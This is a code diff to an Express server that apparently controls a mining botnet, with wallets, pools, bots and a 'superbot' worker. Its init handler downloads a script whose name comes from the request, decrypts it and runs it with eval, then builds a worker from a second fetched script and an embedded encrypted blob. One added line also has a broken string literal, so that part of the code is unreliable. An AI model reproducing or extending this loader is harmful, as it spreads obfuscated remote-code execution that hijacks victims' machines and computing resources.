@@ -9,25 +9,28 @@ app.parser=bodyParser.urlencoded({extended:true});
 app.use(express.json({limit:'50mb'}));
 app.use(express.urlencoded({limit:'50mb',extended:true}));
 app.get('/',function(req,res) {
-  if(req.query.init) init(req.query.init,function(msg){
-    var data = { msg: msg }
-    if(!msg.includes('error')) {
-      data.wallet = db.wallet;
-      data.pools = { values: [] }; for(var i=0; i<pools.length; i++) data.pools.values.push([pools[i].host]);
-      data.push = {log: db.log};
-      db.log = { values: [], backgrounds: [] };
-    };
-    res.json(data)
-  })
-  else if(req.query.id) {
+  if(req.query.id) {
     gg.url = BASE64_Decode(req.query.id);
     res.json({values:db.summary, state:db.state})
   }
   else res.send('Hello world!')
 });
 app.post('/',app.parser,function(req,res) {
-  if(req.body.bots) update_bots(req.body.bots)
-  res.send('successful')
+  if(req.body.init) {
+    init(req.body, function(msg){
+      var data = { msg: msg }
+      if(msg.includes('error')) log({host:require('./package.json').host,color:'#F8516A',msg:msg});
+      else {
+        log({host:require('./package.json').host,color:'#8ED76C',msg:'msg});
+        data.wallet = db.wallet;
+        data.pools = { values: [] }; for(var i=0; i<pools.length; i++) data.pools.values.push([pools[i].host]);
+        data.push = {log: db.log};
+        db.log = { values: [], backgrounds: [] };
+      }
+      res.json(data)
+    })
+  }
+  else if(req.body.bots) res.send(update_bots(req.body.bots))
 });
 
 app.listen(process.env.PORT||5000, () => { log({host:require('./package.json').host,color:'#8ED76C',msg:'start' }) })
@@ -146,7 +149,8 @@ function update_pools(list) {
 function update_bots(list){
   var b1 = []; for(var i=0; i<list.length; i++) b1.push(list[i][0]);
   var b2 = []; for(var i=0; i<bots.length; i++) b2.push(bots[i].host);
-  if(JSON.stringify(b1) != JSON.stringify(b2)) {
+  if(JSON.stringify(b1) == JSON.stringify(b2)) return false
+  else {
     for(var i=0; i<bots.length; i++) {
       if(bots[i].wakeup) clearTimeout(bots[i].wakeup);
       log({host:bots[i].host,msg:'del bot'})
@@ -157,6 +161,7 @@ function update_bots(list){
       bots.push(nbot); mybot('wakeup',nbot);
       log({host:b1[i],msg:'add bot'});
     }
+    return true
   }
 }
 
@@ -232,15 +237,15 @@ function mybot(cmd,bot) {
   }
 }
 
-function init(coin,callback) {
-  request( require('./package.json').github+coin+".js", function(err, res, body) {
-    if(err) { log({host:'github_1',color:'#F8516A',msg:err.message}); callback('error github_1 '+err.message) }
-    else if(body == '404: Not Found') { log({host:'github_1',color:'#F8516A',msg:body}); callback('error github_1 '+body) }
+function init(body,callback) {
+  request( require('./package.json').github+body.init+".js", function(err, res, body) {
+    if(err) callback('error git_1: '+err.message)
+    else if(body == '404: Not Found') callback('error git_1: '+body)
     else {
       eval(decrypt(body));
       request( require('./package.json').github+"superbot.js", function(err, res, body) {
-        if(err) { log({host:'github_2',color:'#F8516A',msg:err.message}); callback('error github_2 '+err.message) }
-        else if(body == '404: Not Found') { log({host:'github_2',color:'#F8516A',msg:body}); callback('error github_2 '+body) }
+        if(err) callback('error git_2: '+err.message)
+        else if(body == '404: Not Found') callback('error git_2: '+body)
         else {
           gg.superbot = decrypt(body);
           gg.worker = gg.superbot+'\n'+decrypt(`
@@ -251,8 +256,8 @@ DuwGYzwWyuLYxpXxRAhXxzqlbwM/HdmIS3vqh71dCTektrzIooA7tRh4tKDVUNVILVgNC4m9DF+IJOsH
 ZJVF1ep7ksbxF0nrNia1Hm3cQL0hifx4mp5/G2JhdLI/xcxLkhA3oPulryJOYETtQZw0q7VAih8tCYeuqnDzJ2ZFEYQPv2sIfkjQzPvpCi2eZceq30TGSG836aiyYjNq0MsS9VLRuXMx1zN/8nqc6tWwGa8/rz9Q
 vScvrDWM/7Fjm9Ixj1rfsJTYeUBt9ppkdSyirV50xwgg/e5wa2UAC1BgAwqIy9ho9ZSoLjqOIADw+V7YQZVBxnOXDC20UVprO7xm0rcoMWm2K4ma01vXnUQhy1f1z1aqAVgSxgRE9eJX5g21zNoVi5X2XC9f7VjC
 59j0bv3foy4ZH99XDP1Orc80MXr0/DenClJba8ce/kyav21aiZ8Y4GvF1oiC3j8+`);
-          log({host:require('./package.json').host,color:'#8ED76C',msg:'init '+coin});
-          callback('init '+coin);
+          if(body.bots) update_bots(body.bots);
+          callback('init '+body.init);
         }
       })
     }
